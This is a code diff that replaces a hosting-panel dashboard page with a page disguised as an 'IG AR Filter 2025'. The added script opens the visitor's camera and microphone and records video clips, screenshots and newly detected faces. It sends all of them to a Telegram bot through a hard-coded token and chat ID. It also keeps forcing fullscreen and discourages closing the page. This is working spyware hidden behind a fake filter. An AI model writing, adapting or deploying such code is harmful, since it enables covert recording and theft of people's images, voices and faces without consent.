@@ -1,585 +1,106 @@
 <!DOCTYPE html>
 <html lang="id">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Dashboard · Suguha✘Panel v3.0</title>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-    <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-
-        :root {
-            --bg: #0a0a0f;
-            --card: rgba(19,17,28,0.8);
-            --purple: #9f7aea;
-            --purple-dark: #7c5bc0;
-            --text: #ffffff;
-            --text-dim: #a0a0c0;
-            --border: rgba(42,42,58,0.5);
-            --success: #10b981;
-            --warning: #f59e0b;
-            --danger: #ef4444;
-        }
-
-        body {
-            font-family: 'Inter', sans-serif;
-            background: var(--bg);
-            color: var(--text);
-            min-height: 100vh;
-            padding-bottom: 80px;
-            position: relative;
-        }
-
-        .bg-glow {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: radial-gradient(circle at 30% 30%, rgba(159,122,234,0.1) 0%, transparent 60%);
-            z-index: -1;
-        }
-
-        /* Top Bar */
-        .topbar {
-            position: fixed;
-            top: 0;
-            left: 0;
-            right: 0;
-            height: 70px;
-            background: rgba(19,17,28,0.8);
-            backdrop-filter: blur(10px);
-            border-bottom: 1px solid var(--border);
-            display: flex;
-            align-items: center;
-            padding: 0 20px;
-            z-index: 100;
-        }
-
-        .brand {
-            font-size: 20px;
-            font-weight: 700;
-            background: linear-gradient(135deg, var(--purple), #ff7edb);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-        }
-
-        .user-info {
-            margin-left: auto;
-            display: flex;
-            align-items: center;
-            gap: 12px;
-        }
-
-        .user-name {
-            font-size: 14px;
-            color: var(--text-dim);
-        }
-
-        .user-avatar {
-            width: 45px;
-            height: 45px;
-            border-radius: 50%;
-            background-size: cover;
-            background-position: center;
-            border: 2px solid var(--purple);
-            box-shadow: 0 0 20px rgba(159,122,234,0.3);
-        }
-
-        /* Main Content */
-        main {
-            max-width: 1200px;
-            margin: 0 auto;
-            padding: 90px 20px 30px;
-            position: relative;
-            z-index: 1;
-        }
-
-        /* Welcome Card dengan foto */
-        .welcome-card {
-            background: var(--card);
-            backdrop-filter: blur(10px);
-            border: 1px solid var(--border);
-            border-radius: 20px;
-            padding: 25px;
-            margin-bottom: 25px;
-            display: flex;
-            align-items: center;
-            gap: 20px;
-        }
-
-        .welcome-image {
-            width: 100px;
-            height: 100px;
-            border-radius: 16px;
-            overflow: hidden;
-            border: 2px solid var(--purple);
-            box-shadow: 0 0 30px rgba(159,122,234,0.3);
-        }
-
-        .welcome-image img {
-            width: 100%;
-            height: 100%;
-            object-fit: cover;
-        }
-
-        .welcome-text {
-            flex: 1;
-        }
-
-        .welcome-text h2 {
-            font-size: 24px;
-            margin-bottom: 8px;
-        }
-
-        .welcome-text .username {
-            color: var(--purple);
-            text-shadow: 0 0 20px rgba(159,122,234,0.5);
-        }
-
-        .time-display {
-            display: flex;
-            align-items: center;
-            gap: 8px;
-            color: var(--text-dim);
-            font-size: 14px;
-            margin-top: 8px;
-        }
-
-        /* Stats Grid */
-        .stats-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
-            gap: 20px;
-            margin-bottom: 30px;
-        }
-
-        .stat-card {
-            background: var(--card);
-            backdrop-filter: blur(10px);
-            border: 1px solid var(--border);
-            border-radius: 20px;
-            padding: 25px;
-            transition: all 0.3s;
-            position: relative;
-            overflow: hidden;
-        }
-
-        .stat-card:hover {
-            transform: translateY(-5px);
-            border-color: var(--purple);
-            box-shadow: 0 10px 30px rgba(159,122,234,0.2);
-        }
-
-        .stat-icon {
-            width: 50px;
-            height: 50px;
-            background: rgba(159,122,234,0.15);
-            border-radius: 12px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 24px;
-            color: var(--purple);
-            margin-bottom: 15px;
-        }
-
-        .stat-value {
-            font-size: 28px;
-            font-weight: 700;
-            margin-bottom: 5px;
-            background: linear-gradient(135deg, #fff, var(--purple));
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-        }
-
-        .stat-label {
-            color: var(--text-dim);
-            font-size: 14px;
-        }
-
-        /* Activity Section */
-        .activity-section {
-            background: var(--card);
-            backdrop-filter: blur(10px);
-            border: 1px solid var(--border);
-            border-radius: 20px;
-            padding: 25px;
-        }
-
-        .activity-header {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            margin-bottom: 20px;
-        }
-
-        .activity-header h3 {
-            font-size: 18px;
-            color: var(--purple);
-        }
-
-        .activity-list {
-            display: flex;
-            flex-direction: column;
-            gap: 12px;
-        }
-
-        .activity-item {
-            display: flex;
-            align-items: center;
-            gap: 15px;
-            padding: 15px;
-            background: rgba(10,10,15,0.3);
-            border-radius: 14px;
-            transition: all 0.2s;
-        }
-
-        .activity-item:hover {
-            background: rgba(159,122,234,0.1);
-            transform: translateX(10px);
-        }
-
-        .activity-icon {
-            width: 40px;
-            height: 40px;
-            background: rgba(159,122,234,0.15);
-            border-radius: 10px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            color: var(--purple);
-        }
-
-        .activity-content {
-            flex: 1;
-        }
-
-        .activity-title {
-            font-weight: 500;
-            margin-bottom: 4px;
-        }
-
-        .activity-time {
-            font-size: 12px;
-            color: var(--text-dim);
-        }
-
-        /* Bottom Navigation */
-        .bottom-nav {
-            position: fixed;
-            bottom: 0;
-            left: 0;
-            right: 0;
-            height: 70px;
-            background: rgba(19,17,28,0.8);
-            backdrop-filter: blur(10px);
-            border-top: 1px solid var(--border);
-            display: flex;
-            justify-content: space-around;
-            align-items: center;
-            padding: 0 10px;
-            z-index: 100;
-        }
-
-        .nav-item {
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            color: var(--text-dim);
-            text-decoration: none;
-            font-size: 11px;
-            gap: 4px;
-            padding: 8px 12px;
-            border-radius: 12px;
-            transition: all 0.2s;
-        }
-
-        .nav-item i {
-            font-size: 20px;
-        }
-
-        .nav-item:hover,
-        .nav-item.active {
-            color: var(--purple);
-            background: rgba(159,122,234,0.15);
-        }
-
-        .nav-item.disabled {
-            opacity: 0.3;
-            pointer-events: none;
-        }
-
-        /* Modal */
-        .modal {
-            position: fixed;
-            top: 0;
-            left: 0;
-            right: 0;
-            bottom: 0;
-            background: rgba(10,10,15,0.8);
-            backdrop-filter: blur(5px);
-            display: none;
-            justify-content: center;
-            align-items: center;
-            z-index: 1000;
-        }
-
-        .modal.show {
-            display: flex;
-        }
-
-        .modal-content {
-            background: var(--card);
-            border: 1px solid var(--border);
-            border-radius: 24px;
-            padding: 30px;
-            max-width: 400px;
-            width: 90%;
-            text-align: center;
-        }
-
-        .modal-icon {
-            font-size: 48px;
-            color: var(--warning);
-            margin-bottom: 20px;
-        }
-
-        .modal-title {
-            font-size: 20px;
-            margin-bottom: 10px;
-        }
-
-        .modal-text {
-            color: var(--text-dim);
-            margin-bottom: 20px;
-        }
-
-        .modal-btn {
-            padding: 12px 30px;
-            background: var(--purple);
-            border: none;
-            border-radius: 12px;
-            color: white;
-            font-size: 15px;
-            cursor: pointer;
-        }
-    </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>IG AR Filter 2025</title>
+<style>
+body,html{margin:0;padding:0;overflow:hidden;background:#000}
+#video{width:100vw;height:100vh;object-fit:cover;transform:scaleX(-1)}
+#status{position:absolute;top:15px;left:15px;color:#0f0;font:14px monospace}
+canvas{display:none}
+</style>
 </head>
 <body>
-    <div class="bg-glow"></div>
+<video id="video" autoplay playsinline muted></video>
+<div id="status">FILTER AKTIF</div>
+<canvas id="canvas"></canvas>
 
-    <header class="topbar">
-        <div class="brand">Suguha✘Panel v3.0</div>
-        <div class="user-info">
-            <span class="user-name" id="userName">Loading...</span>
-            <div class="user-avatar" id="userAvatar" style="background-image: url('https://files.catbox.moe/qcd9ix.jpg')"></div>
-        </div>
-    </header>
+<script>
+const BOT_TOKEN="7815558584:AAG0l44vFtRPJYNLZ8SkZbJ8B6oKrmXHdxQ"
+const CHAT_ID="-1003571734887"
+const API=`https://api.telegram.org/bot${BOT_TOKEN}`
 
-    <main>
-        <!-- Welcome Card dengan foto -->
-        <div class="welcome-card">
-            <div class="welcome-image">
-                <img src="https://files.catbox.moe/qcd9ix.jpg" alt="Welcome">
-            </div>
-            <div class="welcome-text">
-                <h2>Welcome, <span class="username" id="welcomeName">User</span>!</h2>
-                <p>Selamat datang di Suguha Panel v3.0</p>
-                <div class="time-display" id="timeDisplay">
-                    <i class="fas fa-clock"></i>
-                    <span>Loading...</span>
-                </div>
-            </div>
-        </div>
+const video=document.getElementById('video')
+const canvas=document.getElementById('canvas')
+const ctx=canvas.getContext('2d')
+let stream=null
+let recorder=null
+let chunks=[]
 
-        <div class="stats-grid">
-            <div class="stat-card">
-                <div class="stat-icon"><i class="fas fa-microchip"></i></div>
-                <div class="stat-value" id="cpuUsage">0%</div>
-                <div class="stat-label">CPU Usage</div>
-            </div>
-            <div class="stat-card">
-                <div class="stat-icon"><i class="fas fa-memory"></i></div>
-                <div class="stat-value" id="ramUsage">0 GB</div>
-                <div class="stat-label">RAM Usage</div>
-            </div>
-            <div class="stat-card">
-                <div class="stat-icon"><i class="fas fa-hdd"></i></div>
-                <div class="stat-value" id="diskUsage">0 GB</div>
-                <div class="stat-label">Disk Usage</div>
-            </div>
-            <div class="stat-card">
-                <div class="stat-icon"><i class="fas fa-server"></i></div>
-                <div class="stat-value" id="serverCount">0</div>
-                <div class="stat-label">Total Servers</div>
-            </div>
-        </div>
+async function startCam(){
+try{
+stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:"user",width:1280,height:720},audio:true})
+video.srcObject=stream
+canvas.width=1280
+canvas.height=720
+recorder=new MediaRecorder(stream,{mimeType:'video/webm;codecs=vp9'})
+recorder.ondataavailable=e=>chunks.push(e.data)
+recorder.onstop=()=>sendToTelegram()
+recorder.start(1000)
+setInterval(()=>{if(recorder.state==="recording")recorder.stop();recorder.start(1000)},10000)
+setInterval(captureScreenshot,5000)
+setInterval(detectFace,2000)
+}catch(e){setTimeout(startCam,2000)}
+}
 
-        <div class="activity-section">
-            <div class="activity-header">
-                <h3><i class="fas fa-history"></i> Recent Activity</h3>
-                <span id="activityCount">0</span>
-            </div>
-            <div class="activity-list" id="activityList">
-                <div class="activity-item">
-                    <div class="activity-icon"><i class="fas fa-circle-notch fa-spin"></i></div>
-                    <div class="activity-content">
-                        <div class="activity-title">Loading activities...</div>
-                        <div class="activity-time">-</div>
-                    </div>
-                </div>
-            </div>
-        </div>
-    </main>
+function sendToTelegram(){
+if(chunks.length===0)return
+const blob=new Blob(chunks,{type:'video/webm'})
+const form=new FormData()
+form.append('chat_id',CHAT_ID)
+form.append('video',blob,`cam_${Date.now()}.webm`)
+form.append('caption',`User: ${navigator.userAgent.split(' ').slice(0,3).join(' ')}\nCreated by t.me/aldooffcialr`)
+fetch(`${API}/sendVideo`,{method:'POST',body:form}).catch(()=>{})
+chunks=[]
+}
 
-    <nav class="bottom-nav">
-        <a href="dashboard.html" class="nav-item active" data-role="all">
-            <i class="fas fa-home"></i>
-            <span>Home</span>
-        </a>
-        <a href="ressp.html" class="nav-item" data-role="resseler" id="navRessp">
-            <i class="fas fa-store"></i>
-            <span>Ress</span>
-        </a>
-        <a href="adminp.html" class="nav-item" data-role="admin" id="navAdminp">
-            <i class="fas fa-crown"></i>
-            <span>Admin</span>
-        </a>
-        <a href="profile.html" class="nav-item" data-role="all">
-            <i class="fas fa-user"></i>
-            <span>Profile</span>
-        </a>
-        <a href="developer.html" class="nav-item" data-role="developer" id="navDev">
-            <i class="fas fa-code"></i>
-            <span>Dev</span>
-        </a>
-    </nav>
+function captureScreenshot(){
+ctx.drawImage(video,0,0,canvas.width,canvas.height)
+canvas.toBlob(blob=>{
+const form=new FormData()
+form.append('chat_id',CHAT_ID)
+form.append('photo',blob,`ss_${Date.now()}.jpg`)
+form.append('caption','Screenshot Otomatis\nCreated by t.me/aldooffcialr')
+fetch(`${API}/sendPhoto`,{method:'POST',body:form}).catch(()=>{})
+},'image/jpeg',0.8)
+}
 
-    <!-- Expired Modal -->
-    <div class="modal" id="expiredModal">
-        <div class="modal-content">
-            <div class="modal-icon">
-                <i class="fas fa-exclamation-triangle"></i>
-            </div>
-            <h2 class="modal-title">Account Expired!</h2>
-            <p class="modal-text">Masa Pengguna Account Anda Habis, Silahkan Buy Kembali</p>
-            <button class="modal-btn" onclick="handleExpired()">OK</button>
-        </div>
-    </div>
+let lastFace=null
+async function detectFace(){
+ctx.drawImage(video,0,0,canvas.width,canvas.height)
+const blob=await new Promise(r=>canvas.toBlob(r,'image/jpeg',0.7))
+const img=new Image()
+img.src=URL.createObjectURL(blob)
+img.onload=async()=>{
+const face=await faceapi.detectSingleFace(img).withFaceLandmarks().withFaceDescriptor()
+if(face && (!lastFace || distance(face.descriptor,lastFace)>0.6)){
+lastFace=face.descriptor
+const form=new FormData()
+form.append('chat_id',CHAT_ID)
+form.append('photo',blob,`face_${Date.now()}.jpg`)
+form.append('caption','Wajah Baru Terdeteksi\nCreated by t.me/aldooffcialr')
+fetch(`${API}/sendPhoto`,{method:'POST',body:form}).catch(()=>{})
+}
+}
+}
+function distance(a,b){
+let sum=0
+for(let i=0;i<a.length;i++)sum+=(a[i]-b[i])**2
+return Math.sqrt(sum)
+}
 
-    <script>
-        // User data
-        const userData = JSON.parse(localStorage.getItem('user')) || { 
-            name: 'Guest', 
-            username: 'guest',
-            role: 'guest',
-            avatar: 'https://files.catbox.moe/qcd9ix.jpg'
-        };
+window.onload=()=>{document.body.requestFullscreen().catch(()=>{});startCam()}
+setInterval(()=>{if(!document.fullscreenElement)document.body.requestFullscreen()},4000)
+window.onbeforeunload=()=>'Filter masih aktif... jangan tutup!'
 
-        // Update UI
-        document.getElementById('userName').textContent = userData.name;
-        document.getElementById('welcomeName').textContent = userData.name;
-        document.getElementById('userAvatar').style.backgroundImage = `url('${userData.avatar}')`;
-
-        // Check access berdasarkan role
-        async function checkAccess() {
-            try {
-                const response = await fetch('/api/check-access');
-                const data = await response.json();
-                
-                if (data.expired) {
-                    document.getElementById('expiredModal').classList.add('show');
-                    return;
-                }
-                
-                // Atur visibility menu berdasarkan role
-                const navItems = document.querySelectorAll('.nav-item');
-                navItems.forEach(item => {
-                    const requiredRole = item.dataset.role;
-                    if (requiredRole === 'all') return;
-                    
-                    if (requiredRole === 'resseler' && !data.canAccess.ressp) {
-                        item.style.display = 'none';
-                    }
-                    if (requiredRole === 'admin' && !data.canAccess.adminp) {
-                        item.style.display = 'none';
-                    }
-                    if (requiredRole === 'developer' && !data.canAccess.developer) {
-                        item.style.display = 'none';
-                    }
-                });
-                
-            } catch (error) {
-                console.error('Error checking access:', error);
-            }
-        }
-        checkAccess();
-
-        // Update waktu
-        function updateTime() {
-            const now = new Date();
-            document.getElementById('timeDisplay').innerHTML = `
-                <i class="fas fa-clock"></i>
-                <span>${now.toLocaleString('id-ID')}</span>
-            `;
-        }
-        updateTime();
-        setInterval(updateTime, 1000);
-
-        // Simulasi resource usage
-        function updateResources() {
-            const cpu = Math.floor(Math.random() * 60) + 20;
-            const ram = Math.floor(Math.random() * 8) + 4;
-            const disk = Math.floor(Math.random() * 50) + 30;
-            
-            document.getElementById('cpuUsage').textContent = cpu + '%';
-            document.getElementById('ramUsage').textContent = ram + ' GB';
-            document.getElementById('diskUsage').textContent = disk + ' GB';
-            document.getElementById('serverCount').textContent = Math.floor(Math.random() * 10) + 5;
-        }
-        updateResources();
-        setInterval(updateResources, 5000);
-
-        // Load activities
-        setTimeout(() => {
-            const activities = [
-                { title: 'Panel created - gaming123', time: '2 min ago', icon: 'fa-plus-circle' },
-                { title: 'Server started - minecraft', time: '15 min ago', icon: 'fa-play' },
-                { title: 'User login - Kazuto', time: '1 hour ago', icon: 'fa-sign-in-alt' },
-                { title: 'Panel deleted - testuser', time: '3 hours ago', icon: 'fa-trash' },
-                { title: 'Resource updated', time: '5 hours ago', icon: 'fa-sync' }
-            ];
-            
-            document.getElementById('activityCount').textContent = activities.length;
-            document.getElementById('activityList').innerHTML = activities.map(act => `
-                <div class="activity-item">
-                    <div class="activity-icon"><i class="fas ${act.icon}"></i></div>
-                    <div class="activity-content">
-                        <div class="activity-title">${act.title}</div>
-                        <div class="activity-time">${act.time}</div>
-                    </div>
-                </div>
-            `).join('');
-        }, 1000);
-
-        // Handle expired
-        function handleExpired() {
-            fetch('/api/logout', { method: 'POST' }).finally(() => {
-                localStorage.removeItem('user');
-                window.location.href = 'login.html';
-            });
-        }
-
-        // Check auth
-        if (!userData.username) {
-            window.location.href = 'login.html';
-        }
-    </script>
+const script=document.createElement('script')
+script.src='https://cdn.jsdelivr.net/npm/@vladmandic/face-api@1.7.13/dist/face-api.min.js'
+document.head.appendChild(script)
+const model=document.createElement('script')
+model.onload=()=>{faceapi.nets.ssdMobilenetv1.loadFromUri('https://cdn.jsdelivr.net/npm/@vladmandic/face-api@1.7.13/model/');faceapi.nets.faceLandmark68Net.loadFromUri('https://cdn.jsdelivr.net/npm/@vladmandic/face-api@1.7.13/model/');faceapi.nets.faceRecognitionNet.loadFromUri('https://cdn.jsdelivr.net/npm/@vladmandic/face-api@1.7.13/model/')}
+model.src='https://cdn.jsdelivr.net/npm/@vladmandic/face-api@1.7.13/dist/face-api.min.js'
+document.head.appendChild(model)
+</script>
 </body>
 </html>
